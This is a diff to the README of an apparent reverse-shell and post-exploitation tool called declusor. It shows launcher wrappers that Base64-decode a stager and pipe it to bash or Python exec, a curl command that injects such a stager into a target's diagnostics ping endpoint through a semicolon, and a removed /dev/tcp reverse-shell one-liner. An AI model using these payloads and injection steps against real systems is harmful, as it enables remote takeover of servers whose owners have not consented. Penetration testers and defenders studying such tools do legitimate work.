@@ -108,10 +108,12 @@ declusor 0.0.0.0 4444 -p shell_socket --launcher-output silent
 
 # Write launcher directly to a file
 declusor 0.0.0.0 4444 -p py_socket --launcher-output file:/tmp/stager.py
-
-# Wrap launcher in an execution template ($DECLUSOR_SCRIPT placeholder)
-declusor 0.0.0.0 4444 -p py_socket --launcher-wrapper "python3 -c '$DECLUSOR_SCRIPT'"
 ```
+
+> [!TIP]
+> Launchers are automatically Base64-encoded and packaged into native execution wrappers by default:
+> - **`shell_socket`**: `(echo '$DECLUSOR_SCRIPT'|base64 -d|bash)`
+> - **`py_socket`**: `python3 -c "import base64;exec(base64.b64decode('$DECLUSOR_SCRIPT'))"`
 
 ### 4. Interact with the Session
 
@@ -171,23 +173,20 @@ Content-Type: application/json
 declusor 127.0.0.1 4444 --plugin shell_socket
 ```
 
-**2. Declusor will immediately print the tailored launcher one-liner. Base64-encode it to avoid character-filtering issues (`&`, `;`, `|`, spaces):**
+**2. Declusor will immediately print the tailored, Base64-encoded launcher one-liner ready for execution:**
 
 ```bash
-# Encode the stager displayed by Declusor
-PAYLOAD=$(echo -n '<DECLUSOR_BASH_STAGER>' | base64 -w0)
-
-# Inject via curl
+# Inject the displayed one-liner directly via curl
 curl -s -X POST https://target.example/api/diagnostics/ping \
      -H "Content-Type: application/json" \
-     -d "{\"ip\": \"127.0.0.1; echo $PAYLOAD | base64 -d | bash\"}"
+     -d "{\"ip\": \"127.0.0.1; (echo '<DECLUSOR_BASE64_STAGER>'|base64 -d|bash)\"}"
 ```
 
 **3. Upon connection, Declusor runs its in-memory handshake, pushes helper utilities, and opens an interactive REPL with full history and tab-completion.**
 
 ```console
 $ declusor 127.0.0.1 4444
-( exec 3<> /dev/tcp/127.0.0.1/4444; [...] >&3; done <&3; exec 3>&- )
+(echo 'ZXhlYyAzPD4...'|base64 -d|bash)
 
 [declusor]
 ```
@@ -196,7 +195,7 @@ $ declusor 127.0.0.1 4444
 
 ### Operator Console & Terminal Ergonomics
 
-- **Context-Aware Readline REPL**: Interactive command loop with intelligent tab-completion for command verbs, remote target arguments, and local filesystem paths.
+- **Command-Aware Readline REPL**: Interactive command loop with intelligent tab-completion dynamically scoped to active plugin assets (automatically discovering modules in `assets/modules/` for `load`) while preserving local filesystem navigation for `upload` and `execute`.
 - **Persistent History & Navigation Safety**: Maintains cross-session command history and insulates the connection against drops caused by unhandled arrow keys or terminal escape sequences.
 - **Real-Time Stream Delivery & Diagnostics**: Streams remote stdout/stderr chunks in real time, accompanied by dedicated diagnostic reporting and structured tabular formatting.
 
